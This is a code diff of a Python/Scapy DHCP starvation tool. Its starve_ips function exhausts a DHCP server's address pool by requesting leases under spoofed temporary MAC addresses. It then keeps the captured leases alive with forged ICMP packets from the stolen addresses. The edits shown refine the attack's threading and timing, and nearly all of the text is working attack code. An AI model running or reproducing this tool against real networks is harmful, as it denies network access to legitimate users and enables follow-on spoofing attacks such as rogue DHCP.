@@ -283,7 +283,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         time.sleep(time_to_wait)
         
-        keep_alive_thread = threading.Thread(target=keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac], name='sniff for offer')
+        keep_alive_thread = threading.Thread(target=keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac])
         if((args.keep_alive_while_starving) and (len(occupied_ips) != 0)):
             print(f"{function_name} : keeping alive while starving")
             keep_alive_thread.start()
@@ -297,7 +297,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer], name='sniff for offer')
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer])
         sniff_thread.start()
         
         time.sleep(0.2)
@@ -308,6 +308,9 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         if(offer[0] is None):
             print('no offer captured')
             time_to_wait += 1
+            try:
+                keep_alive_thread.join()
+            except:1
             continue
         
         offered_ip = offer[0][BOOTP].yiaddr
@@ -322,10 +325,12 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         if(is_acked):
             occupied_ips.append((offered_ip, temp_mac, interface))
         
+        try:
+            keep_alive_thread.join()
+        except:1
         
-        keep_alive_thread._stop()
-
-        time_to_wait -= 1
+        if(time_to_wait >= 2):
+            time_to_wait -= 1
     return occupied_ips
 
 
@@ -336,8 +341,8 @@ def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interfa
     packet = Ether(dst = dst_mac, src = src_mac , type=ETHER_TYPES.IPv4)\
             / IP(src = src_ip, dst = dst_ip)\
             / ICMP()
-    if(args.debug):
-        print(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
+    # if(args.debug):
+    #     print(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
     
     sendp(packet, iface=interface)
 
@@ -346,11 +351,8 @@ def keep_ips_alive_icmp(devices : List[Tuple[str,str]], dhcp_server_ip : str, dh
     if(args.debug):
         print(f"{function_name} : keeping alive these ips : {devices}")
     
-    i = 5
-    while(True):
-        time.sleep(2)
-        for device in devices:
-            sendp_icmp(dst_ip=dhcp_server_ip, dst_mac=dhcp_server_mac,src_ip=device[0], src_mac=device[1], interface=device[2])
+    for device in devices:
+        sendp_icmp(dst_ip=dhcp_server_ip, dst_mac=dhcp_server_mac,src_ip=device[0], src_mac=device[1], interface=device[2])
 
 
 
